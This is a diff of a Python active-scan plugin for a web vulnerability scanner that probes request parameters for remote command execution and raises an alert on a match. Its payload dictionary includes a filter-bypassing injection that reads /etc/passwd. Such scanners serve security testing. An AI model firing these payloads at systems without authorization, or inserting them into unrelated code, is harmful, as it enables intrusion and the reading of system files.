@@ -1,11 +1,9 @@
+
 """
 github : https://github.com/knassar702/scant3r
 --
-* Scant3r - web application vulnerability scanner
 * Coded by : Khaled Nassar @knassar702
-* Version : 0.5#Beta
-
-RCE scanner with modern payloads :)
+* Email : knassar702@gmail.com
 """
 def scanNode(sas, msg):
   # Copy requests before reusing them
@@ -16,6 +14,7 @@ def scanNode(sas, msg):
 
   # Test the responses and raise alerts as below
 
+# bypass filter
 rce_payloads = {
     '''
 cat${IFS}/etc/passwd''':'root:x:0:0',
@@ -35,7 +34,9 @@ def scan(sas, msg, param, value):
   # setParam (message, parameterName, newValue)
     sas.setParam(msg, param, P);
   # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
-    sas.sendAndReceive(msg, True, False);
+    sas.sendAndReceive(msg, False, False);
+  # Test the response here, and make other requests as required
+#  print('scan called for url=' + msg.getRequestHeader().getURI().toString());
     if message in msg.getResponseBody().toString():
   	# Change to a test which detects the vulnerability
     # raiseAlert(risk, int reliability, String name, String description, String uri,
@@ -43,5 +44,5 @@ def scan(sas, msg, param, value):
     #		int cweId, int wascId, HttpMessage msg)
     # risk: 0: info, 1: low, 2: medium, 3: high
     # reliability: 0: falsePassitive, 1: suspicious, 2: warning
-        sas.raiseAlert(3, 3, 'ScanT3r - Remote Code Execution (RCE)', 'Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.',msg.getRequestHeader().getURI().toString(), param, P, '', '',message, 0, 0, msg);
+        sas.raiseAlert(3, 3, 'Remote Code Execution (Script)', 'Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.',msg.getRequestHeader().getURI().toString(), param, P, '', '',message, 0, 0, msg);
         break
